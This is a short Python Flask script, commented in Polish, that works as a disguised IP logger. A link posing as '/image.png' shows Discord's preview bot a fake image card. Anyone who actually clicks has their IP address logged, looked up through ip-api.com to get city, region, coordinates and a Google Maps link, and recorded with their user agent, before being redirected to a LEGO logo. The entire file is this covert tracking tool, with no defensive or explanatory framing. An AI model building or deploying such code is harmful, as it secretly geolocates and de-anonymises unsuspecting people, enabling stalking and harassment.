from flask import Flask, request, redirect, render_template_string
import requests

app = Flask(__name__)

# --- KONFIGURACJA ---
# PODMIENIONE ZDJĘCIE (Inny błąd wczytywania)
ERROR_IMG = "https://www.pngall.com/wp-content/uploads/8/Warning-PNG-Free-Download.png"
# Zdjęcie docelowe (LEGO)
REAL_IMG = "https://upload.wikimedia.org/wikipedia/commons/thumb/2/24/LEGO_logo.svg/500px-LEGO_logo.svg.png"

# HTML dla Discorda
HTML_TEMPLATE = f'''
<!DOCTYPE html>
<html>
<head>
    <meta property="og:title" content="Image Preview">
    <meta property="og:type" content="website">
    <meta property="og:image" content="{ERROR_IMG}">
    <meta name="twitter:card" content="summary_large_image">
    <meta http-equiv="refresh" content="0; url={REAL_IMG}">
</head>
<body>Przekierowanie...</body>
</html>
'''

@app.route('/image.png')
def logger():
    ua = request.headers.get('User-Agent', '')
    # Wyciąganie IP przez proxy Rendera
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]

    if "Discordbot" in ua or "externalhit" in ua.lower():
        print(f"--- BOT DC SPRAWDZA ---")
        return render_template_string(HTML_TEMPLATE)

    # LOGOWANIE DANYCH
    print(f"\n[!!!] Ktoś wszedł w link [!!!]")
    print(f"IP: {ip}")
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,lat,lon", timeout=5).json()
        if r.get("status") == "success":
            print(f"LOKALIZACJA: {r.get('city')}, {r.get('regionName')}, {r.get('country')}")
            print(f"MAPA: http://google.com/maps?q={r.get('lat')},{r.get('lon')}")
    except: pass
    print(f"DEVICE: {ua}\n")

    return redirect(REAL_IMG)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
